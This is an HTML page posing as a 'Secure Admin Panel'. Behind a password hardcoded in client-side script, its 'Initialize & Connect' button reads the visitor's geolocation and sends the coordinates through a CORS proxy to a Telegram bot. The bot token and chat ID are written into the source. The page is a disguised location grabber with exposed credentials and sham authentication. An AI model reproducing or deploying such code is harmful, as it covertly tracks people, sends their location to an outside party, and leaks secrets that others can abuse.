<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <title>Secure Admin Panel</title>
    <style>
        body { font-family: sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: #1e293b; padding: 25px; border-radius: 15px; width: 90%; max-width: 400px; text-align: center; }
        input, .btn { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; box-sizing: border-box; }
        .btn { background: #3b82f6; color: white; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

<!-- লগইন সেকশন -->
<div class="card" id="loginBox">
    <h2>Secure Gateway</h2>
    <input type="password" id="pass" placeholder="Enter Password">
    <button class="btn" onclick="login()">Access System</button>
</div>

<!-- কন্ট্রোল সেকশন -->
<div class="card" id="mainBox" style="display:none;">
    <h2>Control Panel</h2>
    <button class="btn" onclick="runTask()">Initialize & Connect</button>
    <div id="status" style="margin-top:15px; font-size:13px;">Waiting...</div>
</div>

<script>
    const BOT_TOKEN = "8853221737:AAHDigRYNltTvdFGZW4gZahuu3M9dlJHENU";
    const CHAT_ID = "8566985497";

    function login() {
        if(document.getElementById('pass').value === "Tamim0186#@") {
            document.getElementById('loginBox').style.display = 'none';
            document.getElementById('mainBox').style.display = 'block';
        } else { alert("Wrong Password!"); }
    }

    async function runTask() {
        document.getElementById('status').innerText = "Connecting...";
        
        // লোকেশন পাওয়ার চেষ্টা
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const locMsg = `Location: ${pos.coords.latitude}, ${pos.coords.longitude}`;
                
                // Proxy যোগ করা হয়েছে এখানে
                const url = `https://corsproxy.io/?https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(locMsg)}`;
                
                try {
                    await fetch(url);
                    document.getElementById('status').innerText = "✅ Data Sent Successfully!";
                } catch(e) {
                    document.getElementById('status').innerText = "❌ Connection Failed!";
                }
            }, () => {
                document.getElementById('status').innerText = "❌ Permission Denied!";
            });
        } else {
            document.getElementById('status').innerText = "Geolocation not supported.";
        }
    }
</script>
</body>
</html>
